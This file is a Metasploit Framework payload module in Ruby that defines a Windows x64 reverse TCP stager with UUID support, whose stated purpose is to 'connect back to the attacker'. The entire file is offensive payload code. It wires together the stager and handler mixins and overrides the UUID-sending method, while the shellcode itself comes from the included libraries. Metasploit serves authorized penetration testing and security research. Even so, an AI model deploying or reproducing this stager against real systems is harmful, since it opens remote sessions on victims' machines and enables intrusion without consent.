##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/windows/x64/reverse_tcp'

module MetasploitModule

  CachedSize = 490

  include Msf::Payload::Stager
  include Msf::Payload::Windows::ReverseTcp_x64

  def self.handler_type_alias
    'reverse_tcp_uuid'
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Reverse TCP Stager with UUID Support (Windows x64)',
      'Description' => 'Connect back to the attacker with UUID Support (Windows x64)',
      'Author'      => [ 'sf', 'OJ Reeves' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X64,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Convention'  => 'sockrdi',
      'Stager'      => { 'RequiresMidstager' => false }
    ))
  end

  #
  # Override the uuid function and opt-in for sending the
  # UUID in the stage.
  #
  def include_send_uuid
    true
  end
end
